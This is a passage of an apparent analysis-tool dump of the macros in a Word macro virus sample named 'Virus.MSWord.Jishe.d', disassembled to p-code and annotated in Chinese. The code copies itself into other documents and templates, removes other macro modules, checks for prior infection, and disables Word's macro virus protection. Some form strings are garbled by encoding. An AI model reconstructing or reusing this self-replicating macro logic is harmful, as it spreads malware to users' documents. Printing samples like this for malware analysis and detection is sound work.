' 	LitVarSpecial (False)
' 	St Infect 
' Line #130:
' Line #131:
' 	QuoteRem 0x0004 0x0026 "清除目标文档中已经存在的其他模块及代码"
' Line #132:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #133:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #134:
' 	Ld xItem 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #135:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xItem 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #136:
' 	ElseBlock 
' Line #137:
' 	Ld xItem 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #140:
' Line #141:
' 	QuoteRem 0x0004 0x001C "向文档中写入本程序代码及模块"
' Line #142:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyModule 
' 	Add 
' 	Ld TargetFile 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyModule 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0002 
' Line #143:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyUserForm 
' 	Add 
' 	Ld TargetFile 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld cMyUserForm 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0002 
' Line #144:
' Line #145:
' 	QuoteRem 0x0004 0x0047 " ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^"
' Line #146:
' Line #147:
' 	QuoteRem 0x0004 0x0049 "该程序段如果放在前两个语句之前，就会导致VBA32.DLL程序出现致命错误而死机，"
' Line #148:
' 	QuoteRem 0x0004 0x002E "穷我之毕生编程经验，不知何故，天哪！天理何在？"
' Line #149:
' Line #150:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #151:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St myStr 
' Line #152:
' 	LitDI2 0x0001 
' 	Ld myStr 
' 	LitDI2 0x0001 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #153:
' Line #154:
' 	LitVarSpecial (True)
' 	St Infect 
' Line #155:
' 	EndFunc 
' Line #156:
' 	QuoteRem 0x0000 0x0022 "检查指定文档中是否已经有本程序代码"
' Line #157:
' 	FuncDefn (Private Function Infected(TargetFile))
' Line #158:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn LinesofCode (As Integer)
' Line #159:
' 	Dim 
' 	VarDefn BeInfected (As Integer)
' Line #160:
' 	Dim 
' 	VarDefn myType (As String)
' 	VarDefn NewVersion (As String)
' Line #161:
' Line #162:
' 	Ld TargetFile 
' 	ArgsLd TypeName 0x0001 
' 	St myType 
' Line #163:
' 	Ld myType 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myType 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #164:
' 	LitStr 0x000C "使用数据类型"
' 	Ld myType 
' 	Add 
' 	LitStr 0x0038 "调用函数Infected，系统只允许使用Document及Template类型。"
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #165:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #166:
' 	ExitFunc 
' Line #167:
' 	EndIfBlock 
' Line #168:
' Line #169:
' 	QuoteRem 0x0004 0x0016 "检查目标文档是否被保护"
' Line #170:
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #171:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #172:
' 	ExitFunc 
' Line #173:
' 	EndIfBlock 
' Line #174:
' Line #175:
' 	QuoteRem 0x0004 0x0040 "当ThisDocument,myModule,myUserForm均存在时，表示该文件已经被感染"
' Line #176:
' 	LitDI2 0x0000 
' 	St BeInfected 
' Line #177:
' 	Ld cMyID 
' 	Ld cMyVersion 
' 	Concat 
' 	St NewVersion 
' Line #178:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #179:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #180:
' 	Ld xItem 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #181:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld NewVersion 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #182:
' 	Ld BeInfected 
' 	LitDI2 0x0001 
' 	Or 
' 	St BeInfected 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Eq 
' 	ElseIfBlock 
' Line #185:
' 	Ld BeInfected 
' 	LitDI2 0x0002 
' 	Or 
' 	St BeInfected 
' Line #186:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Eq 
' 	ElseIfBlock 
' Line #187:
' 	Ld BeInfected 
' 	LitDI2 0x0004 
' 	Or 
' 	St BeInfected 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #190:
' 	Ld BeInfected 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #192:
' 	ElseBlock 
' Line #193:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	EndFunc 
' Line #196:
' 	QuoteRem 0x0000 0x0028 "检查指定的打开文档及模板中是否有病毒存在"
' Line #197:
' 	FuncDefn (Private Function ScanDocument(myDocOrTemp) As Integer)
' Line #198:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn i (As Integer)
' 	VarDefn myStr (As String)
' Line #199:
' 	Dim 
' 	VarDefn LinesofCode (As Integer)
' 	VarDefn NewVersion (As String)
' Line #200:
' Line #201:
' 	Ld cOK 
' 	St ScanDocument 
' Line #202:
' 	Ld cMyID 
' 	Ld cMyVersion 
' 	Concat 
' 	St NewVersion 
' Line #203:
' 	QuoteRem 0x0004 0x0014 "检查参数类型是否正确"
' Line #204:
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #205:
' 	LitStr 0x0038 "调用函数ScanDocument只能使用Document及Template数据类型。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #206:
' 	ExitFunc 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	Ld myDocOrTemp 
' 	MemLd New 
' 	LitStr 0x000A "检查结果："
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St myStr 
' Line #209:
' 	QuoteRem 0x0004 0x0016 "检查程序模块是否被保护"
' Line #210:
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #211:
' 	Ld cDocProtected 
' 	St ScanDocument 
' Line #212:
' 	Ld myStr 
' 	LitStr 0x0046 "  文件中的程序代码被保护，系统无法自动查杀，但也可能存在病毒，请小心！"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St myStr 
' Line #213:
' 	ExitFunc 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #216:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #217:
' 	QuoteRem 0x000C 0x004A "此部分有代码时，如果总行数超出了规定的行数或者找不到本模块标志则认定为病毒"
' Line #218:
' 	Ld xItem 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #219:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #220:
' 	Ld LinesofCode 
' 	Ld cLinesofThisDocument 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #221:
' 	Ld ScanDocument 
' 	Ld cDocHasCodeElse 
' 	Or 
' 	St ScanDocument 
' Line #222:
' 	Ld myStr 
' 	LitStr 0x0003 "  <"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0023 ">对象中有其他程序存在，大概是病毒。"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St myStr 
' Line #223:
' 	Ld NewVersion 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	ElseIfBlock 
' 	QuoteRem 0x005C 0x0014 "查找是否有新版本存在"
' Line #224:
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' 	QuoteRem 0x0053 0x0014 "查找是否有旧版本存在"
' Line #225:
' 	Ld cDocHasOldVersion 
' 	St ScanDocument 
' Line #226:
' 	ElseBlock 
' Line #227:
' 	Ld ScanDocument 
' 	Ld cDocHasCodeElse 
' 	Or 
' 	St ScanDocument 
' Line #228:
' 	Ld myStr 
' 	LitStr 0x0003 "  <"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0023 ">对象中有其他程序存在，大概是病毒。"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St myStr 
' Line #229:
' 	EndIfBlock 
' Line #230:
' 	EndIfBlock 
' Line #231:
' 	EndIfBlock 
' Line #232:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Ne 
' 	Paren 
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #233:
' 	QuoteRem 0x000C 0x0034 "文档中除本模块代码之外，如果还有其它代码则认定为病毒"
' Line #234:
' 	Ld ScanDocument 
' 	Ld cDocHasModuleElse 
' 	Or 
' 	St ScanDocument 
' Line #235:
' 	Ld myStr 
' 	LitStr 0x000D "  有其他模块<"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0017 ">存在，极有可能是病毒。"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St myStr 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	StartForVariable 
' 	Next 
' Line #238:
' 	Ld ScanDocument 
' 	Ld cOK 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld myStr 
' 	LitStr 0x0016 "没有病毒，请放心使用。"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St myStr 
' 	EndIf 
' Line #239:
' 	Ld pVirusReport 
' 	Ld myStr 
' 	Add 
' 	St pVirusReport 
' Line #240:
' 	EndFunc 
' Line #241:
' 	QuoteRem 0x0000 0x002A "清除指定的打开文档及模板中的病毒模块及代码"
' Line #242:
' 	FuncDefn (Private Function ClearDocument(myDocOrTemp) As Boolean)
' Line #243:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn LinesofCode (As Integer)
' Line #244:
' 	Dim 
' 	VarDefn NewVersion (As String)
' Line #245:
' Line #246:
' 	LitVarSpecial (False)
' 	St ClearDocument 
' Line #247:
' 	QuoteRem 0x0004 0x0014 "检查参数类型是否正确"
' Line #248:
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #249:
' 	LitStr 0x0039 "调用函数ClearDocument只能使用Document及Template数据类型。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #250:
' 	ExitFunc 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #253:
' 	LitVarSpecial (True)
' 	St ClearDocument 
' Line #254:
' 	ExitFunc 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	QuoteRem 0x0004 0x0012 "检查文档是否有病毒"
' Line #257:
' 	Ld cMyID 
' 	Ld cDocHasOldVersion 
' 	Concat 
' 	St NewVersion 
' Line #258:
' 	Ld myDocOrTemp 
' 	ArgsLd ScanDocument 0x0001 
' 	IfBlock 
' Line #259:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #260:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #261:
' 	Ld xItem 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #262:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld NewVersion 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #263:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xItem 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #264:
' 	EndIfBlock 
' Line #265:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Ne 
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #266:
' 	Ld xItem 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	StartForVariable 
' 	Next 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	LitVarSpecial (True)
' 	St ClearDocument 
' Line #271:
' 	EndFunc 
' Line #272:
' 	QuoteRem 0x0000 0x0016 "关闭Word宏病毒保护功能"
' Line #273:
' 	ConstFuncExpr 
' 	LitVarSpecial (False)
' 	FuncDefn (Public Function CloseVirusProtection(Optional Protected As Boolean))
' Line #274:
' 	Ld Protected 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #275:
' 	EndFunc 
' Line #276:
' Macros/VBA/VirusReport - 5084 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x000C "窗体程序代码"
' Line #18:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "程序中的变量必须先定义后使用"
' Line #19:
' 	QuoteRem 0x0000 0x0014 "打开窗体时执行的操作"
' Line #20:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #21:
' 	LitVarSpecial (True)
' 	Ld CheckBox1 
' 	MemSt Value 
' Line #22:
' 	Ld pVirusReport 
' 	Ld Information 
' 	MemSt Value 
' Line #23:
' 	ArgsCall Beep 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	QuoteRem 0x0000 0x0016 "关闭窗体，不作任何处理"
' Line #26:
' 	FuncDefn (Private Sub CommandButtonNothing_Click())
' Line #27:
' 	Dim 
' 	VarDefn ret (As Integer)
' Line #28:
' 	LitStr 0x003C "领导，虽然你可能会批评我，但还是要告诉你，这样做是很危险的。"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x001A "是否真的不做处理，请批示。"
' 	Concat 
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x000A "再次报告！"
' 	ArgsLd MsgBox 0x0003 
' 	St ret 
' Line #29:
' 	Ld ret 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndSub 
' Line #33:
' 	QuoteRem 0x0000 0x0014 "打开VisulBasic编辑器"
' Line #34:
' 	FuncDefn (Private Sub CommandButtonOpenVisubasic_Click())
' Line #35:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #36:
' 	EndSub 
' Line #37:
' 	QuoteRem 0x0000 0x0006 "杀病毒"
' Line #38:
' 	FuncDefn (Private Sub CommandButtonKill_Click())
' Line #39:
' 	Ld ClearVirus 
' 	IfBlock 
' Line #40:
' 	ArgsCall ResetMenu 0x0000 
' Line #41:
' 	ArgsCall InfectAll 0x0000 
' Line #42:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #43:
' 	LitStr 0x0034 "按照您的指示，我已经把可能是病毒的东东全部清理完毕，"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0028 "不过也可能好心办了坏事，那可不要怪我哟。"
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0006 "报告！"
' 	ArgsCall MsgBox 0x0003 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	LitStr 0x003A "不知什么原因，清除病毒工作不成功，请您手工检查或与我联系。"
' 	Ld vbOKOnly 
' 	LitStr 0x0010 "冀慎华向您报告："
' 	ArgsCall MsgBox 0x0003 
' Line #46:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndSub 
' Line #49:
' 	QuoteRem 0x0000 0x0016 "恢复被病毒更改的菜单项"
' Line #50:
' 	FuncDefn (Private Function ResetMenu(id_FFFE As Variant))
' Line #51:
' 	Dim 
' 	VarDefn mItem
' 	VarDefn cItem
' 	VarDefn myKey (As KeyBinding)
' Line #52:
' Line #53:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #54:
' 	QuoteRem 0x0004 0x0013 "Alt+F8:打开宏对话框"
' Line #55:
' 	SetStmt 
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	Set myKey 
' Line #56:
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000A "ToolsMacro"
' 	ParamNamed Command 
' 	Ld myKey 
' 	ArgsMemCall Rebind 0x0002 
' Line #57:
' 	QuoteRem 0x0004 0x001D "Alt+F11:打开VisualBasic编辑器"
' Line #58:
' 	SetStmt 
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	Set myKey 
' Line #59:
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000A "ViewVBCode"
' 	ParamNamed Command 
' 	Ld myKey 
' 	ArgsMemCall Rebind 0x0002 
' Line #60:
' 	Ld wdKeyAlt 
' 	Ld wdKeyH 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #61:
' 	Ld wdKeyAlt 
' 	Ld wdKeyK 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #62:
' Line #63:
' 	QuoteRem 0x0004 0x0016 "恢复工具菜单的原始设置"
' Line #64:
' 	StartForVariable 
' 	Ld mItem 
' 	EndForVariable 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #65:
' 	Ld mItem 
' 	ArgsMemCall Reset 0x0000 
' Line #66:
' 	StartForVariable 
' 	Ld mItem 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #68:
' 	Ld cItem 
' 	ArgsMemCall Reset 0x0000 
' Line #69:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	Ld CommandBars 
' 	ForEach 
' Line #71:
' 	Ld cItem 
' 	MemLd Visible 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld msoBarNoProtection 
' 	Ld cItem 
' 	MemSt Protection 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	EndFunc 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNSn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe.d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
